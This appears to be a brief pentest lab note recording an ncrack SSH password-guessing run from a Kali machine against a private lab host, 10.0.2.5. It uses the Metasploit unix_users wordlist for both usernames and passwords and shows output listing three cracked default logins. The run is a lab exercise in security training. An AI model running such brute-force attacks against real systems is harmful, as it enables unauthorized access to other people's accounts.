wordlists: `/usr/share/wordlists/metasploit/unix_users.txt`, 

`sudo ncrack -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_users.txt ssh://10.0.2.5 -v`

```
sudo ncrack -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_users.txt ssh://10.0.2.5 -v -v
[sudo] password for kali: 

Starting Ncrack 0.7 ( http://ncrack.org ) at 2022-07-17 05:56 EDT

Discovered credentials on ssh://10.0.2.5:22 'postgres' 'postgres'
Discovered credentials on ssh://10.0.2.5:22 'service' 'service'
Discovered credentials on ssh://10.0.2.5:22 'user' 'user'
ssh://10.0.2.5:22 finished.

Discovered credentials for ssh on 10.0.2.5 22/tcp:
10.0.2.5 22/tcp ssh: 'postgres' 'postgres'
10.0.2.5 22/tcp ssh: 'service' 'service'
10.0.2.5 22/tcp ssh: 'user' 'user'

Ncrack done: 1 service scanned in 8095.01 seconds.
Probes sent: 26883 | timed-out: 0 | prematurely-closed: 26871

Ncrack finished.
```